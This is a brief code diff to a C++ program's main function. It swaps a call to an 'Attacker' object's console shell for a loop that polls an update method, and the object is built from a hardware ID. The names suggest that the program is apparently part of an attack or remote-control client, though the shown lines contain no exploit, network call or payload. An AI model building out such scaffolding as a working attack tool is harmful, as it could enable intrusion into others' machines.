@@ -118,5 +118,9 @@ static std::string getHardwareId() {
 int main() {
     Attacker attacker(getHardwareId());
 
-	return attacker.runConsoleShell();
+    int status = 0;
+    while (status == 0)
+        status = attacker.update(); 
+
+	return (status > 0) ? 0 : status;
 }
